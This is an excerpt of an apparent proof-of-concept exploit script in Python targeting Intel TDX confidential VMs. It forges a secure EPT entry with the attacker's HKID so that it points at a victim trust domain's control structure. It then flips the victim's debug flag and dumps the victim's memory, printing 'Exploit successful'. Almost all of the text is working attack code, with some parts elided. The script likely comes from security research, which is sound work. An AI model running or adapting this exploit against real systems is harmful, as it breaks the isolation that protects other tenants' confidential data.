...
def main():
  ...
  with open("/tmp/tdx-demo-td-pid.pid", 'r') as f:
    pid_attacker = int(f.read().strip())

  with open("/tmp/tdx-victim.pid", 'r') as f:
    pid_victim = int(f.read().strip())

  gateway = Gateway()
  tdxtend = Tdxtend(INVALID_PID, gateway)

  tdr_pa_attacker = gateway.get_tdr_pa(pid_attacker)
  tdcs_pa_attacker = gateway.get_tdcs_pa(pid_attacker)

  tdr_pa_victim = gateway.get_tdr_pa(pid_victim)
  tdcs_pa_victim = gateway.get_tdcs_pa(pid_victim)

  hkid_attacker = 0x21  # TODO: gateway.get_hkid()
  hkid_victim = 0x22  # TODO: gateway.get_hkid()

  print("[*] Querying victim TD details")
  print_info(f"Victim TDR PA:  {tdr_pa_victim:#x}")
  print_info(f"Victim TDCS PA: {tdcs_pa_victim:#x}")
  print_info(f"Victim HKID:    {hkid_victim:#x}")
  print()
  print("[*] Querying attacker TD details")
  print_info(f"Attacker TDR PA:  {tdr_pa_attacker:#x}")
  print_info(f"Attacker TDCS PA: {tdcs_pa_attacker:#x}")
  print_info(f"Attacker HKID:    {hkid_attacker:#x}")
  malicious_tdcs_pa = tdcs_pa_victim | (hkid_attacker << HKID_START_BIT)
  print()
  ...
  malicious_sept_entry = malicious_tdcs_pa | flags
  ...
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa_attacker, init_gpa, 0)
  ...
  success = remap(tdxtend, gateway, tdr_pa_attacker, init_gpa, target_hpa, victim_original_hpa)
  if not success:
    return
  
  success = remap(tdxtend, gateway, tdr_pa_attacker, init_gpa, victim_original_hpa, target_hpa)
  if not success:
    return
  ...
  success = add_sept_entry(tdxtend, tdr_pa_attacker, victim_gpa & 0xFFFFFF8000000000, safe_hpa, 3)
  if not success:
    return
  success = add_sept_entry(tdxtend, tdr_pa_attacker, victim_gpa & 0xFFFFFFFFC0000000, safe_hpa + 0x1000, 2)
  if not success:
    return
  
  input("\n[*] Enable the interposer and press enter")
  success = add_sept_entry(tdxtend, tdr_pa_attacker, victim_gpa & 0xFFFFFFFFFFE00000, target_hpa, 1)
  ...
  rc, rcx, rdx, _ = tdxtend.call_tdh_mem_sept_rd(tdr_pa_attacker, victim_gpa, 0)
  if rc == TdxErrorCode.TDX_SUCCESS.value:
    print_info(f"TDH.MEM.SEPT.RD returned entry: {hex(rcx)}")
    # TDH.MEM.SEPT.RD sanitizes the HKID
    if (rcx | (hkid_attacker << HKID_START_BIT)) == malicious_sept_entry:
      print_success(f"Succesfully dropped page, SEPT entry points to victim TDCS.")
  ...
  print(f"[*] Phase 3: Flipping victim debug flag\n")

  gpa_to_read = input("[*] Enter victim GPA to read: ").strip()
  gpa_to_read = int(gpa_to_read, 16)

  print("[*] Suspending Victim VM")
  os.kill(pid_victim, signal.SIGSTOP)
  
  victim_is_debug = False

  while not victim_is_debug:
    input(f"[*] Overwrite victim attributes at GPA={victim_gpa+128:#x} and press enter")
    
    print(f"[*] Verifying victim TD status")
    rax, rcx, rdx, r8 = tdxtend.call_tdh_mem_rd(tdr_pa_victim, gpa_to_read)
    
    if rax == TdxErrorCode.TDX_SUCCESS.value:
      print_success("Exploit successful: Victim TD is now debuggable")
      victim_is_debug = True
    elif rax == TdxErrorCode.TDX_TD_NON_DEBUG.value:
      print_error("Victim is not debuggable (TDX_TD_NON_DEBUG)")
  ...
  print("[*] Dumping victim TD content:")
  data = read_td_bytes(tdxtend, tdr_pa_victim, gpa_to_read)
  print_hexdump(data)


  input("\n[*]Restore guest GCTX and press enter")

  print("[*] Resuming Victim VM")
  os.kill(pid_victim, signal.SIGCONT)
